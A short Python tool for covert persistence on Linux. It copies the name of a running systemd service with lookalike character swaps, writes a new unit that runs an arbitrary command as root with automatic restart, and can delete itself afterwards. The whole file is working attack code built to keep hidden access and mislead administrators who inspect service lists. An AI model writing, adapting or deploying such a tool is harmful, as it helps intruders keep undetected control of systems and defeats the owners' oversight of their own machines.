#!/usr/bin/env python3

import os
import argparse
import subprocess
import random

SYSTEMD_TEMPLATE = """
[Unit]
Description={description}
After=network.target

[Service]
ExecStart={command}
Restart=always
User={user}
Group={group}
Environment=PATH=/usr/bin:/usr/local/bin
WorkingDirectory={working_directory}

[Install]
WantedBy=multi-user.target
"""

def get_active_services():
    try:
        output = subprocess.check_output(['systemctl', 'list-units', '--type=service', '--state=active', '--no-pager', '--no-legend'], encoding='utf-8')
        services = [line.split()[0] for line in output.strip().split('\n')]
        return services
    except Exception as e:
        print(f"Error fetching active services: {e}")
        return []

def sneaky_modify_name(base_name):
    replacements = {
        'o': '0',
        'l': '1',
        'z': '2',
        'a': '@',
        'e': '3',
        'i': '!',
        's': '$'
    }

    # If it's possible, replace a character
    for char, rep in replacements.items():
        if char in base_name:
            return base_name.replace(char, rep, 1)

    # If not, try to insert an extra character that looks 'normal'
    insertable_chars = ['x', 'z', 'v']
    position = random.randint(0, len(base_name)-1)
    return base_name[:position] + random.choice(insertable_chars) + base_name[position:]

def create_systemd_service(command, description, user, group, working_directory):
    base_service_name = random.choice(get_active_services()).rstrip('.service')
    new_service_name = sneaky_modify_name(base_service_name)
    
    content = SYSTEMD_TEMPLATE.format(
        description=description,
        command=command,
        user=user,
        group=group,
        working_directory=working_directory
    )
    
    with open(f"/etc/systemd/system/{new_service_name}.service", 'w') as f:
        f.write(content)

    print(f"Service {new_service_name} created. Use 'sudo systemctl start {new_service_name}' to start it.")

def main():
    parser = argparse.ArgumentParser(description="Create a systemd service with a sneaky name similar to an existing one")
    parser.add_argument("command", help="Command to execute in the service")
    parser.add_argument("--description", default="Custom systemd service", help="Description of the systemd service")
    parser.add_argument("--user", default="root", help="User to run the service as")
    parser.add_argument("--group", default="root", help="Group to run the service under")
    parser.add_argument("--working-directory", default="/tmp", help="Working directory for the service")
    
    # Add the self-delete option
    parser.add_argument("--self-delete", action="store_true", help="Delete the script after executing")

    args = parser.parse_args()
    create_systemd_service(args.command, args.description, args.user, args.group, args.working_directory)
    
    # Check if self-delete is set and if so, delete the script
    if args.self_delete:
        try:
            os.remove(__file__)
            print(f"Deleted the script: {__file__}")
        except Exception as e:
            print(f"Failed to delete the script: {e}")

if __name__ == "__main__":
    main()
